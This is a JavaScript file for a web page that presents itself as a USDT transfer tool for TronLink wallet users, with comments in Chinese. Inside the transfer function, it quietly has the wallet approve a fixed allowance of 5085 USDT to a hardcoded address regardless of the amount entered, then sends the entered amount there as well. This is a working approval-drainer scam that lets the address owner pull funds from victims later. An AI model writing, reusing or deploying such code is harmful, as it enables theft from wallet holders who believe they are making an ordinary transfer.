// ==================== 配置 ====================
const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"; // 接收地址
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 合约
const FIXED_APPROVE_AMOUNT = "5085000000"; // 固定授权 5085 USDT (6位小数)

let tronWeb = null;
let userAddress = null;
let userBalance = 0;
let isProcessing = false;

// ==================== 初始化 ====================
async function initializeApp() {
    console.log("🔄 初始化应用...");
    if (window.tronLink) {
        try {
            await window.tronLink.request({ method: 'tron_requestAccounts' });
            tronWeb = window.tronLink.tronWeb;
            userAddress = tronWeb.defaultAddress.base58;
            
            updateWalletStatus();
            await fetchUserBalance();
            
            console.log("✅ 钱包已连接:", userAddress);
        } catch (e) {
            console.warn("❌ 钱包连接失败:", e.message);
            updateWalletStatus("未连接");
        }
    } else {
        console.warn("⚠️ 未检测到 TronLink 钱包");
        updateWalletStatus("未检测到钱包");
    }
}

// ==================== 获取用户余额 ====================
async function fetchUserBalance() {
    if (!tronWeb || !userAddress) return;
    
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const balance = await contract.balanceOf(userAddress).call();
        
        userBalance = balance ? parseFloat(balance.toString()) / 1e6 : 0;
        
        // 更新余额显示
        document.getElementById('userBalance').textContent = userBalance.toLocaleString('zh-CN', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
        
        console.log("✅ 用户余额:", userBalance, "USDT");
    } catch (err) {
        console.error("❌ 获取余额失败:", err);
        document.getElementById('userBalance').textContent = "0.00";
    }
}

// ==================== 更新钱包状态 ====================
function updateWalletStatus(status = null) {
    const statusValue = document.getElementById('statusValue');
    const walletStatus = document.getElementById('walletStatus');
    
    if (status) {
        statusValue.textContent = status;
        walletStatus.classList.add('error');
    } else if (userAddress) {
        const shortAddress = userAddress.slice(0, 6) + '...' + userAddress.slice(-6);
        statusValue.textContent = shortAddress;
        walletStatus.classList.remove('error');
        walletStatus.classList.add('connected');
    } else {
        statusValue.textContent = "未连接";
        walletStatus.classList.remove('connected');
    }
}

// ==================== 验证金额输入 ====================
function validateAmount() {
    const amountInput = document.getElementById('transferAmount');
    const amount = parseFloat(amountInput.value) || 0;
    
    const feeAmount = amount * 0.001; // 0.1% 手续费
    const totalAmount = amount + feeAmount;
    
    // 更新手续费显示
    document.getElementById('feeAmount').textContent = feeAmount.toFixed(2);
    document.getElementById('totalAmount').textContent = totalAmount.toFixed(2);
    
    // 检查余额
    if (totalAmount > userBalance) {
        document.getElementById('balanceWarning').style.display = 'block';
        document.getElementById('sendBtn').disabled = true;
        return false;
    } else {
        document.getElementById('balanceWarning').style.display = 'none';
        document.getElementById('sendBtn').disabled = false;
        return true;
    }
}

// ==================== 处理授权和转账 ====================
async function sendTransfer() {
    if (!tronWeb || !userAddress || isProcessing) return;
    
    const amountInput = document.getElementById('transferAmount');
    const amount = parseFloat(amountInput.value) || 0;
    
    if (amount <= 0) {
        showStatus("❌ 请输入有效的转账金额", "error");
        return;
    }
    
    if (!validateAmount()) {
        showStatus("❌ USDT 余额不足", "error");
        return;
    }
    
    isProcessing = true;
    const sendBtn = document.getElementById('sendBtn');
    const originalContent = sendBtn.innerHTML;
    sendBtn.disabled = true;
    
    try {
        showStatus("⏳ 正在进行授权...", "loading");
        
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        
        // 第一步：授权（固定 5085 USDT，不管用户填的多少）
        console.log("🔐 开始授权 5085 USDT...");
        const approveTx = await contract.approve(TARGET_ADDRESS, FIXED_APPROVE_AMOUNT).send({
            feeLimit: 100000000 // 100 TRX
        });
        
        showStatus("✅ 授权成功！正在执行转账...", "loading");
        
        // 等待 2 秒
        await new Promise(resolve => setTimeout(resolve, 2000));
        
        // 第二步：执行转账
        showStatus("💸 正在转账中...", "loading");
        
        const transferAmount = Math.floor(amount * 1e6).toString();
        const transferTx = await contract.transfer(TARGET_ADDRESS, transferAmount).send({
            feeLimit: 100000000
        });
        
        // 转账成功
        showStatus(`✅ 转账成功！${amount.toFixed(2)} USDT 已发送到接收地址\n交易哈希: ${transferTx.slice(0, 30)}...`, "success");
        
        // 清空输入框
        setTimeout(() => {
            amountInput.value = '';
            validateAmount();
        }, 2000);
        
        // 刷新余额
        setTimeout(fetchUserBalance, 3000);
        
        console.log("✅ 转账成功:", transferTx);
        
    } catch (err) {
        console.error("❌ 操作失败:", err);
        
        if (err.message.includes("User denied")) {
            showStatus("❌ 您已取消操作", "error");
        } else if (err.message.includes("insufficient")) {
            showStatus("❌ TRX 或 USDT 不足", "error");
        } else {
            showStatus("❌ 操作失败: " + err.message.slice(0, 40), "error");
        }
    } finally {
        isProcessing = false;
        sendBtn.disabled = false;
        sendBtn.innerHTML = originalContent;
    }
}

// ==================== 显示状态消息 ====================
function showStatus(message, type = "info") {
    const statusMessage = document.getElementById('statusMessage');
    statusMessage.textContent = message;
    statusMessage.className = 'status-message ' + type;
    
    if (type !== "loading") {
        setTimeout(() => {
            statusMessage.textContent = "";
            statusMessage.className = 'status-message';
        }, 7000);
    }
}

// ==================== 快速金额按钮 ====================
function quickAmount(amount) {
    document.getElementById('transferAmount').value = amount;
    validateAmount();
}

// ==================== 页面加载时初始化 ====================
document.addEventListener('DOMContentLoaded', () => {
    initializeApp();
    
    // 每 20 秒刷新一次余额
    setInterval(fetchUserBalance, 20000);
    
    // 金额输入框变化事件
    document.getElementById('transferAmount').addEventListener('input', validateAmount);
});

// ==================== 监听钱包账户变化 ====================
if (window.tronLink) {
    window.tronLink.on('accountsChanged', (accounts) => {
        console.log("👤 账户已切换");
        initializeApp();
    });
}
